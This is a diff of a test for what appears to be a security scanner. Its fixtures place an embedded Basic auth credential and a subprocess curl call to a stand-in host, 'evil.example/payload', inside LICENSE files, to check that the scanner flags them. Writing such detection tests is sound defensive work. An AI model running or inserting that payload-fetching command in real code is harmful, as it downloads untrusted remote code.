@@ -93,7 +93,7 @@ def test_text_scanner_routes_extensionless_documentation_through_security_detect
         ("LICENSE.txt", "Authorization: Basic dXNlcjpwYXNz\n", "S702"),
         (
             "LICENSE.rst",
-            'import subprocess\nsubprocess.run(["curl", "https://evil.example/payload"])\n',
+            'from subprocess import run\nsubprocess.run(["curl", "https://evil.example/payload"])\n',
             "S309",
         ),
     ],
